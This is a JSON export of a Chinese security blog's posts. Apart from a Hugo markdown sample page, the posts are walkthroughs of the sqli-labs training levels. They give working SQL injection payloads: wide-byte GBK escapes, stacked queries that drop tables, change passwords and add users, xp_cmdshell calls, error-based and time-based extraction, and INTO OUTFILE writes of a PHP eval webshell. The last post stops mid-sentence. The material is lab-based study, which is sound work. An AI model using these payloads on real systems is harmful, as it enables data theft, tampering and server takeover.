[{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution  Tiam, ad mint andaepu dandae nostion secatur sequo quae. Note that you can use Markdown syntax within a blockquote.\n Blockquote with attribution  Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\n— Rob Pike1\n Tables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\n   Name Age     Bob 27   Alice 23    Inline Markdown within tables    Inline  Markdown  In  Table     italics bold strikethrough  code    Code Blocks Code block with backticks html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;UTF-8\u0026quot; /\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  Code block indented with four spaces \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  List Types Ordered List  First item Second item Third item  Unordered List  List item Another item And another item  Nested list  Item   First Sub-item Second Sub-item  Other Elements — abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL+ALT+Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\n  The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015. \u0026#x21a9;\u0026#xfe0e;\n  ","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/markdown-syntax/","tags":["markdown","css","html","themes"],"title":"Markdown Syntax"},{"content":"前置知识 宽字节注入\n这里参考这位大佬的文章：点击\n在mysql中，用于转义（即在字符串中的符号前加上”\\”）的函数有addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种情况是magic_quote_gpc，不过高版本的PHP将去除这个特性。\n涉及到的基本概念  字符、字符集 字符(character)是组成字符集(character set)的基本单位。对字符赋予一个数值(encoding)来确定这个字符在该字符集中的位置。 UTF8 由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，及UTF(Universal Transformation Format)。 宽字节 GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。  MYSQL的字符集转换过程 1.MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection;\n2.进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：\n 使用每个数据字段的CHARACTER SET设定值; 若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准); 若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值; 若上述值不存在，则使用character_set_server设定值。  将操作结果从内部操作字符集转换为character_set_results。\n重点：宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码。\n宽字节注入原理： GBK 占用两字节\nASCII占用一字节\nPHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\\”），MYSQL默认字符集是GBK等宽字节字符集。\n大家都知道%df' 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\\，变成了 %df\\'，其中\\的十六进制是 %5C ，那么现在 %df\\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\\' = %df%5c%27=縗'，而后面的单引号就逃逸出来了\n这里推荐一个解码网站：点击\nless-32 为了更好的理解SQL注入，我们在源代码中加上两行代码\necho $sql; echo \u0026quot;\u0026lt;br\u0026gt;\u0026quot;;  单引号尝试：\nhttp://localhost/sqli-labs-master/Less-32/?id=1'\n发现这里没有报错，在单引号的前面加上了\\进行转义\n这里我们看下源码\nfunction check_addslashes($string) { $string = preg_replace('/'. preg_quote('\\\\') .'/', \u0026quot;\\\\\\\\\\\\\u0026quot;, $string); //escape any backslash $string = preg_replace('/\\'/i', '\\\\\\'', $string); //escape single quote with a backslash $string = preg_replace('/\\\u0026quot;/', \u0026quot;\\\\\\\u0026quot;\u0026quot;, $string); //escape double quote with a backslash return $string; }  这里用到了addslashes函数进行转义\nmysql_query(\u0026quot;SET NAMES gbk\u0026quot;);  将字符集设置为gbk，可以进行宽字节注入。\ngbk中一个汉字占位两字节，所以可以用%df，与后边的反斜杠组成一个汉字，从而使单引号逃逸。\nhttp://localhost/sqli-labs-master/Less-32/?id=1%df'\n报错：\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1�\\'' LIMIT 0,1' at line 1\n注释掉后面：\nhttp://localhost/sqli-labs-master/Less-32/?id=1%df'--+\n查列：\nhttp://localhost/sqli-labs-master/Less-32/?id=1%df' order by 4--+\n报错： Unknown column '4' in 'order clause'\n说明只有三列\n找回显：\nhttp://localhost/sqli-labs-master/Less-32/?id=-1%df' union select 1,2,3--+\n这里按照以前的知识注入一下\n爆表名：\nhttp://localhost/sqli-labs-master/Less-32/?id=-1%df' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+\n我们这里发现我们的库名'security'由于使用了单引号，也同样被转义了，这里我们可以换成16进制，即：0x7365637572697479\nhttp://localhost/sqli-labs-master/Less-32/?id=-1%df' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+\n后面同理啦\n这里还有一种方法：\n就是 %aa%5c' 这里说一下过程 %aa %5c%5c %5c%27  这里 %5c 和 %27 都是 敏感字符，都会被转义 ，但是，实际过程是这样的%aa%5c %5c%5c %27\n解码后： 可以发现这里单引号摆脱了转义\n==其实两种方法都是两个字符组成一个汉字==\n后面的步骤和第一种方法是一样的\nless-33 function check_addslashes($string) { $string = preg_replace('/'. preg_quote('\\\\') .'/', \u0026quot;\\\\\\\\\\\\\u0026quot;, $string); //escape any backslash $string = preg_replace('/\\'/i', '\\\\\\'', $string); //escape single quote with a backslash $string = preg_replace('/\\\u0026quot;/', \u0026quot;\\\\\\\u0026quot;\u0026quot;, $string); //escape double quote with a backslash return $string; }  和上一关方法一样\nless-34 这一关我们又尝试宽字节注入，\n由于这关是POST传参，我们这里想的是应该是这样的：\nuname=a%df%27%#\u0026amp;passwd=111\u0026amp;submit=Submit\n应该是可以登录成功的，但是这里显示登录失败，我们抓个包看看\n我们可以看到这里：\n在我们想的基础在%af之间多了个%25 ，也就是对%进行了转义，难怪登录失败\n那后面就用burp做吧\n后面同理\n这里我们还能使用在UTF-8下的单引号，转换为UTF-16形式的单引号�'\n发生报错，说明我们可以在这里注入\n后面就和前面一样了\nless-35 这一关的和前面不同的是id的包裹形式不同\nmysql_query(\u0026quot;SET NAMES gbk\u0026quot;); $sql=\u0026quot;SELECT * FROM users WHERE id=$id LIMIT 0,1\u0026quot;;  这里id没有任何符号包裹\n爆回显位置：\nhttp://localhost/sqli-labs-master/Less-35/?id=-1 union select 1,2,3 --+ \n后面同理\n当然这关还可以用延时注入\n举个查数据库长度的例子： http://localhost/sqli-labs-master/Less-35/?id=-1 and if( length(database())\u0026gt;1,1,sleep(5) )\nless-36 此关使用的函数是check_quotes\nfunction check_quotes($string) { $string= mysql_real_escape_string($string); return $string; } // take the variables if(isset($_GET['id'])) { $id=check_quotes($_GET['id']);  那么这里就是肯定会转义单引号\nmysql_query(\u0026quot;SET NAMES gbk\u0026quot;);  这里依旧使用宽字节注入\nhttp://localhost/sqli-labs-master/Less-36/?id=1%df'\n报错：\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1�\\'' LIMIT 0,1' at line 1\n这里找回显：\nhttp://localhost/sqli-labs-master/Less-36/?id=-1%df' union select 1,2,3--+\n后面同上\nless-37 这关依旧使用mysql_real_escape_string函数进行转义，且传参方式为POST\nif(isset($_POST['uname']) \u0026amp;\u0026amp; isset($_POST['passwd'])) { $uname1=$_POST['uname']; $passwd1=$_POST['passwd']; //echo \u0026quot;username before addslashes is :\u0026quot;.$uname1 .\u0026quot;\u0026lt;br\u0026gt;\u0026quot;; //echo \u0026quot;Input password before addslashes is : \u0026quot;.$passwd1. \u0026quot;\u0026lt;br\u0026gt;\u0026quot;; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'User Name:'.$uname1); fwrite($fp,'Password:'.$passwd1.\u0026quot;\\n\u0026quot;); fclose($fp); $uname = mysql_real_escape_string($uname1); $passwd= mysql_real_escape_string($passwd1); //echo \u0026quot;username after addslashes is :\u0026quot;.$uname .\u0026quot;\u0026lt;br\u0026gt;\u0026quot;; //echo \u0026quot;Input password after addslashes is : \u0026quot;.$passwd; // connectivity mysql_query(\u0026quot;SET NAMES gbk\u0026quot;);  这里我们使用Burp抓包注入\n或者将UTF-8下的单引号 转为为UTF-16的 �'\n方法同34关\n","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/sqli-labs-less32-37%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/","tags":["Sqli-labs"],"title":"Sqli Labs Less 32-37 宽字节注入"},{"content":"前置知识 堆叠注入：\n这里引用这位大佬的博客：点击\n0x00 堆叠注入定义 Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。\n0x01 堆叠注入原理 在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where product id=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。\n0x02 堆叠注入的局限性 堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。\n此图是从原文中截取过来的，因为我个人的测试环境是php+mysql，是可以执行的，此处对于mysql/php存在质疑。但个人估计原文作者可能与我的版本的不同的原因。虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。\n0x03 各个数据库实例介绍 本节我们从常用数据库角度出发，介绍几个类型的数据库的相关用法。数据库的基本操作，增删查改。以下列出数据库相关堆叠注入的基本操作。\n1.Mysql （1）新建一表\nselect * from users where id=1;create table test like users;  执行成功，我们再去看一下是否新建成功表。\n（2）删除上面新建的test表\nselect * from users where id=1;drop table test;  （3）查询数据\nselect * from users where id=1;select 1,2,3;  （4）加载文件\nselect * from users where id=1;select load_file('c:/tmpupbbn.php');  (5) 修改数据\nselect * from users where id=1;insert into users(id,username,password) values ('100','new','new');  2. Sql server (1)增加数据表\nselect * from test;create table sc3(ss CHAR(8));  (2) 删除数据表\nselect * from test;drop table sc3;  (3)查询数据\nselect 1,2,3;select * from test;  (4)修改数据\nselect * from test;update test set name='test' where id=3;  (5)sqlserver中最为重要的存储过程的执行\nselect * from test where id=1;exec master..xp_cmdshell 'ipconfig'  3.Oracle 上面的介绍中我们已经提及，oracle不能使用堆叠注入，可以从图中看到，当有两条语句在同一行时，直接报错。无效字符。后面的就不往下继续尝试了。\n4.Postgresql (1)新建一个表\nselect * from user_test;create table user_data(id DATE);  可以看到user_data表已经建好。\n(2)删除上面新建的user_data表\nselect * from user_test;delete from user_data;  (3)查询数据\nselect * from user_test;select 1,2,3;  (4) 修改数据\nselect * from user_test;update user_test set name='modify' where name='张三';  less-38 这里我们使用堆叠注入创建一个表 shaw\nhttp://localhost/sqli-labs-master/Less-38/?id=1';create table shaw like users;--+\n这里执行成功\n这里表也成功创建\n然后我们再把这个表删掉\nhttp://localhost/sqli-labs-master/Less-38/?id=1';drop table shaw ;--+\n这里发现表被删除了\n当然这里也可以修改密码\nhttp://localhost/sqli-labs-master/Less-38/?id=1' ;update users set password='111' where username='Dumb';--+发现密码已经被修改了。\n这里看到，密码确实被改了\n这里记得重新配置一下数据库\nless-39 http://localhost/sqli-labs-master/Less-39/?id=1'根据报错就可以看出是数字型注入。\n操作和上关一样。这次我们来创建一个新用户吧. http://localhost/sqli-labs-master/Less-39/?id=1;insert into users values(111,'test','test');\n依旧记得重置数据库\nless-40 这关关闭了报错提示，但是我们依然可以根据页面的变化判断闭合方式。\nhttp://localhost/sqli-labs-master/Less-40/?id=1'，页面异常，说明包裹参数的有单引号，\n注释掉后面的，http://localhost/sqli-labs-master/Less-40/?id=1' --+,页面还没有正常回显，说明包裹参数的还有其他符号。\n再加一个括号，http://localhost/sqli-labs-master/Less-40/?id=1') --+,页面正常，说明闭合方式为单引号括号。')\n其他操作和前面两关一样。\nless-41 测试单引号双引号等都回显不正常，说明为数字型注入\n后面操作同上\nless-42 这关换了个页面：是个典型的登录注册改密码页面\n$username = mysqli_real_escape_string($con1, $_POST[\u0026quot;login_user\u0026quot;]); $password = $_POST[\u0026quot;login_password\u0026quot;]; $sql = \u0026quot;SELECT * FROM users WHERE username='$username' and password='$password'\u0026quot;;  可以看到用户名进行了转义，而密码处没有。\n在密码处进行万能密码登录，用户名随便输，密码处111' or 1 #\n发现登录成功，我们用户名上面有显示\n成功进入一个修改密码的页面。但是很遗憾不能进行注入了。\n$curr_pass= mysql_real_escape_string($_POST['current_password']); $pass= mysql_real_escape_string($_POST['password']); $re_pass= mysql_real_escape_string($_POST['re_password']);  在密码处输入111'，报错\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''111''' at line 1\n那么这关就可以用报错注入了\n111' and updatexml(1,concat(0x7e,substr((select group_concat(username,0x7e,password) from users),1,27),0x7e),1) #\n还可以从密码处堆叠注入,操作同上\npassword=111';insert into users values(711,'test','test'); #,成功创建用户。\n虽然这里显示的是失败页面，但是数据还是被我们加入了\n最后记得重置一下数据库\nless-43 尝试单引号，发现报错\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'')' at line 1\n得出闭合方式为 ')\n其余步骤同上\nless-44 发现本关关闭了报错，不能进行报错注入了。\n密码处尝试望能密码。111' or 1 #,成功登录，这也验证了闭合方式就是单引号。\n我们还可以进行堆叠注入。\n密码处输入：111';insert into users values(711,'test','test');#;用250用户登录，登陆成功\nless-45 发现本关也关闭了报错，不能进行报错注入了。\n继续尝试万能密码。\n111' or 1 #,并不能登入，可能闭合方式不是单引号，\n继续尝试111') or 1 #登入。\n进行堆叠注入，与前几关一样，只不过闭合方式改变了。\npayload: 111');insert into users values(711,'test','test');#\nless-46 在做这关之前我们又需要补充一些知识\n补充知识：\n  asc：指定列按升序排列\n  desc：指定列按降序排列\n  fields terminated by：各列的分割符号\n  lines terminated by：各行的分割符\n  我们在命令行中测试一下：\n这里我们随便写入个字符\nselect * from users into outfile 'E:\\\\phpstudy\\\\phpstudy_pro\\\\PHPTutorial\\\\WWW\\\\test.php' fields terminated by ',' lines terminated by 'shaw';\n文件确实被写入，并且用 , 和 shaw 分隔开\n这样的话其实就很危险了，我们可以写入一句话木马\nselect * from users into outfile 'E:\\\\phpstudy\\\\phpstudy_pro\\\\PHPTutorial\\\\WWW\\\\test.php' fields terminated by ',' lines terminated by '\u0026lt;?php @eval($_POST[\u0026quot;shaw\u0026quot;]);?\u0026gt;';\n当然这里使用十六进制也是可以的，即：\nselect * from users into outfile 'E:\\\\phpstudy\\\\phpstudy_pro\\\\PHPTutorial\\\\WWW\\\\test.php' fields terminated by ',' lines terminated by 0x3c3f70687020406576616c28245f504f53545b2273686177225d293b3f3e;\n回到题目：\n这个题的界面和之前的又不太一样\n应该是提示我们要使用sort\n这里我们先让 sort 等于 1 看下\n再尝试等于2\n我们这里发现 ID 的顺序乱了,我们猜出，sql为 select * from users order by $id\nhttp://localhost/sqli-labs-master/Less-46/?sort=1 desc输入desc或者asc可降序升序排列，说明可能存在注入。\nhttp://localhost/sqli-labs-master/Less-46/?sort=(select 1)成功以第一列进行排序。\nhttp://localhost/sqli-labs-master/Less-46/?sort=1'报错\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1，说明可以尝试报错注入。\nhttp://localhost/sqli-labs-master/Less-46/?sort=(select updatexml(1,concat(0x5e,database(),0x7e),1))成功爆出数据库名。\nhttp://localhost/sqli-labs-master/Less-46/?sort=1 and sleep(5)有延迟，说明可以时间注入。\npayload: http://localhost/sqli-labs-master/Less-46/?sort=(if(length(database())\u0026gt;1,1,sleep(5)))\n还可以将一句话写入，就像补充知识的那样。\n指定各列之间的分隔符为‘，’而行之间的分隔符为‘\\n’。\nselect * from users into outfile 'E:\\\\phpstudy\\\\phpstudy_pro\\\\PHPTutorial\\\\WWW\\\\test.php' fields terminated by ',' lines terminated by '\\n\u0026lt;?php eval($_POST[shaw]);?\u0026gt;';  当然也可以把一句话换成十六进制写入：\nselect * from users into outfile 'E:\\\\phpstudy\\\\phpstudy_pro\\\\PHPTutorial\\\\WWW\\\\test.php' fields terminated by ',' lines terminated by 0x3c3f70687020406576616c28245f504f53545b2273686177225d293b3f3e;\n写入后的效果上面有\nless-47 这里先试一下单引号'\n发现报错\n You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1\n由报错信息可知，闭合方式为 '\npayload:\nhttp://localhost/sqli-labs-master/Less-47/?sort=1' and updatexml(1,concat(0x5e,database(),0x7e),1) --+\nhttp://localhost/sqli-labs-master/Less-47/?sort=1' and if(length(database())\u0026gt;1,1,sleep(5)) --+\nhttp://localhost/sqli-labs-master/Less-47/?sort=1' into outfile 'E:\\\\phpstudy\\\\phpstudy_pro\\\\PHPTutorial\\\\WWW\\\\test.php' fields terminated by ',' lines terminated by 0x3c3f70687020406576616c28245f504f53545b2273686177225d293b3f3e;--+\nless-48 先尝试一下单引号\nhttp://localhost/sqli-labs-master/Less-48/?sort=1'\n发现没有报错信息，那么这关就无法使用报错注入了\n可用前面关卡的剩余方法\n这里\nhttp://localhost/sqli-labs-master/Less-47/?sort=1' and if(length(database())\u0026gt;1,1,sleep(5)) --+\n显示异常\nhttp://localhost/sqli-labs-master/Less-47/?sort=1 and if(length(database())\u0026gt;1,1,sleep(5)) \n显示正常\n说明是数字型注入\npayload:\nhttp://localhost/sqli-labs-master/Less-47/?sort=1 and if(length(database())\u0026gt;1,1,sleep(5)) \nhttp://localhost/sqli-labs-master/Less-47/?sort=1 into outfile 'E:\\\\phpstudy\\\\phpstudy_pro\\\\PHPTutorial\\\\WWW\\\\test.php' fields terminated by ',' lines terminated by 0x3c3f70687020406576616c28245f504f53545b2273686177225d293b3f3e;\nless-49 同样关闭了报错。\nhttp://localhost/sqli-labs-master/Less-49/?sort=1' --+回显正常。\n说明闭合方式单引号。\n可以使用除了报错的其他方法\npayload:\nhttp://localhost/sqli-labs-master/Less-47/?sort=1' and if(length(database())\u0026gt;1,1,sleep(5))--+ \nhttp://localhost/sqli-labs-master/Less-47/?sort=1' into outfile 'E:\\\\phpstudy\\\\phpstudy_pro\\\\PHPTutorial\\\\WWW\\\\test.php' fields terminated by ',' lines terminated by 0x3c3f70687020406576616c28245f504f53545b2273686177225d293b3f3e;--+\nless-50 这关用了函数mysqli_multi_query()\nmysql_query() 函数执行一条 MySQL 查询。\nmysqli_multi_query() 函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。\n这里很清楚的告诉我们可以进行堆叠注入。\nhttp://localhost/sqli-labs-master/Less-50/?sort=1;insert into users values(711,'test','test');  当然，由于我们一开始尝试单引号http://localhost/sqli-labs-master/Less-50/?sort=1'\n发生报错\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1\n所以也可以使用报错注入，并且为数字型注入\nhttp://localhost/sqli-labs-master/Less-50/?sort=1' and updatexml(1,concat(0x5e,database(),0x7e),1)\n当然其他的方法也是可以的\nless-51 http://localhost/sqli-labs-master/Less-51/?sort=1'报错信息得到单引号闭合。\n其余操作和前面都是一样的。\nless-52 这关输入单引号和双引号都没回显，关闭了报错，也得到时数字型注入。\n这关不能进行报错注入，但可以进行其他注入。跟前面一样。\nless-53 单引号页面回显异常，双引号正常。\nhttp://localhost/sqli-labs-master/Less-53/?sort=1' --+页面正常，说明闭合方式为单引号。\n也不能进行报错注入。可以用前几关方法进行注入。\n","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/sqli-labs-less38-53%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/","tags":["Sqli-labs"],"title":"Sqli Labs Less 38-53 堆叠注入"},{"content":"less-54 这一关只有十次机会，超过十次就会重置表名和密码\nhttp://localhost/sqli-labs-master/Less-54/?id=1  回显正常\nhttp://localhost/sqli-labs-master/Less-54/?id=1' 回显异常\nhttp://localhost/sqli-labs-master/Less-54/?id=1' --+回显正常。\n说明单引号闭合。\nhttp://localhost/sqli-labs-master/Less-54/?id=1' order by 2 --+ 回显正常\nhttp://localhost/sqli-labs-master/Less-54/?id=1' order by 3 --+ 回显正常\nhttp://localhost/sqli-labs-master/Less-54/?id=1' order by 4 --+ 回显异常\n说明有三个字段。\n找回显位置\nhttp://localhost/sqli-labs-master/Less-54/?id=-1' union select 1,2,3 --+回显正常\nhttp://localhost/sqli-labs-master/Less-54/?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 --+爆出表名。 n1lzaaugck\nhttp://localhost/sqli-labs-master/Less-54/?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='n1lzaaugck'),3--+\n爆出列名id,sessid,secret_K3RJ,tryy\nhttp://localhost/sqli-labs-master/Less-54/?id=-1' union select 1,(select group_concat(id,0x7e,sessid,0x7e,secret_K3RJ,0x7e,tryy) from n1lzaaugck),3 --+\n得到：1~1a7f33274089feff1baef7286b95fe0e~K9v8bg0CyvMigjxFQPHvRqIK~10\nless-55 这关有14次机会，让我们隐约感觉会比上一关难搞一点\n通过多次尝试才发现，闭合方式为 ) （其实试了很多次）\nhttp://localhost/sqli-labs-master/Less-55/id=1)--+\n后面步骤和上一关一样\nless-56 此关也是14次机会\n依旧是漫漫的尝试过程\n最终发现闭合方式为')\nhttp://localhost/sqli-labs-master/Less-56/?id=1') --+\n后面的步骤和前面关卡一样\nless-57 依旧为14次\n依旧漫长的尝试\u0026hellip;\n尝试出闭合方式为\u0026quot;\nhttp://localhost/sqli-labs-master/Less-57/?id=1\u0026quot; --+\nless-58 这关只有5次机会了\u0026hellip;\n感觉联合查询是不够了\u0026hellip;\n先试一下单引号吧\nhttp://localhost/sqli-labs-master/Less-58/?id=1'\n这里发现了报错信息，所以我们可以采用报错注入\n获取表名：\nhttp://localhost/sqli-labs-master/Less-58/?id=-1' and updatexml(1, concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e ),1)--+\n得到表名：q0042kuu1q\n获取列名：\nhttp://localhost/sqli-labs-master/Less-58/?id=-1' and updatexml(1, concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='q0042kuu1q'),0x7e),1)--+\n得到列名：id,sessid,secret_R6DV,tryy\n获取数据： http://localhost/sqli-labs-master/Less-58/?id=-1' and updatexml(1,concat(0x7e,(select secret_R6DV from q0042kuu1q),0x7e),1)--+\n得到数据55Ah1OMmu55rkk1GzUQqbszx\n最后，提交就好\nless-59 又是五次\nhttp://localhost/sqli-labs-master/Less-59/?id=1'判断为数字型注入。\n后面的和上一关一样啦\nless-60 经过尝试发现闭合方式为\u0026quot;)\n后面的步骤同上\nless-61 闭合方式为'))\n剩下的步骤和上面一样\nless-62 这关发现，居然有130次，130次！！！ 好吧，这是道盲注= =\n尝试http://localhost/sqli-labs-master/Less-62/?id=1' --+页面返回异常，说明包裹参数的有单引号。\nhttp://localhost/sqli-labs-master/Less-62/?id=1' --+页面还不正常，说明不只有单引号。\n加个括号，http://localhost/sqli-labs-master/Less-62/?id=1') --+页面返回正常，说明闭合方式为单引号括号')\n这关关闭了报错。同样union联合查询也不显示。\n尝试http://localhost/sqli-labs-master/Less-62/?id=1') and sleep(5)--+，页面延迟，，说明可以进行时间注入。\nhttp://localhost/sqli-labs-master/Less-62/??id=1') and if(length(database())\u0026gt;1,1,sleep(5))--+用二分法，\nhttp://localhost/sqli-labs-master/Less-62/?id=1') and if(length((select table_name from information_schema.tables where table_schema=database()))\u0026gt;1,1,sleep(5))--+\nhttp://localhost/sqli-labs-master/Less-62/?id=1') and if(ascii(substr((select table_name from information_schema.tables where table_schema=database()),1,1))\u0026gt;1,1,sleep(5))--+\n之后步骤只需将if()函数的第一个参数改一改就可以了。\nless-63 依旧130次\n单引号回显异常，\n加注释http://localhost/sqli-labs-master//Less-63/?id=1' --+,回显正常，说明闭合方式为单引号'\n后面操作同上\nless-64 还是130次\n尝试ing\n发现两括号闭合。\nhttp://localhost/sqli-labs-master/Less-64/?id=1)) --+页面回显正常验证了就是两括号的闭合方式。\n后面操作同上\nless-65 依旧130次\nhttp://localhost/sqli-labs-master/Less-65/?id=1\u0026quot;) --+页面回显正常，说明闭合方式为双引号括号\u0026quot;)\n后面操作同上\n完结撒花~\n","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/sqli-labs-less54-65/","tags":["Sqli-labs"],"title":"Sqli Labs Less 54-65"},{"content":"预备知识 基础mysql语句：\n查库：\nselect schema_name from information_schema.schemata;  查表：\nselect table_name from information_schema.tables where table_schema='security';  查字段：\nselect column_name from information_schema.columns where table_name='users';  查表：\nselect username,password from security.users;  辅助配置 找到sqli-labs-master 中 less-xx 中 index.php 添加以下代码 echo $sql; //将构造的Sql语句输出 echo \u0026quot;\u0026lt;br\u0026gt;\u0026quot;; //换行  来方便我们理解 sql 注入\n查字段：\nselect id,username,password from security.users;    在 MySQL 中，可使用 SHOW DATABASES;语句来查看或显示当前用户权限范围以内的数据库。==对大小写不敏感==\n  在MySQL中，可使用use database; 改变当前操作数据库\n  在MySQL中，可使用show tables;显示数据库这个表   select * from 表名称 //希望从 \u0026ldquo;xxxx\u0026rdquo; 表中选取所有的列。星号（*）是选取所有列的快捷方式。\n  SELECT * FROM users WHERE id='1' LIMIT 0,1;  //显示表中所有id=1的内容\n  limit 用法\n  由此可知：limit a,b a代表从第a+1个数据开始，b代表显示几个数据\n  order by a语句 //用与对列排序，a为列数 可用来判断表中有多少列\n  如果a大约列数，则报错     union select //联合查询，用来爆出显示位\n   union select 会把两条SQL 语句的查询结果拼接起来，形成一张虚拟的表。联合查询会实现跨库跨表查询，会极大减少SQL 注入的成本。  PS:\n联合查询有两个限制条件  两条SQL 语句的查询结果具有相同的列数 两条SQL 语句相同位置的列具有相同的数据类型   什么是显示位？\n在一个在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数 据展示在页面中，这个展示数据的位置就叫显示位，我们可以利用这个显示位显示我们想查询到的内容\n less-01 1、判断注入类型\n输入：?id=1'报错\n从'1'' LIMIT 0,1可以看出，为字符型注入。那么就可以通过注释我们添加上的 ' 后的内容执行查询。\n**PS：**从上述错误当中，我们可以看到提交到 sql 中的 1’在经过 sql 语句构造后形成 '1'' LIMIT 0,1，其本质是在查询的id参数两边使用单引号包裹，也就是'$id'这种情况，那么我们可以先加上一个单引号与前面的完成闭合，后面的单引号直接用–+或者#（需要编码为%23才能传参）注释掉，这样后面我们需要执行的SQL语句就能逃逸出来了\n2、猜解字段\n利用order by 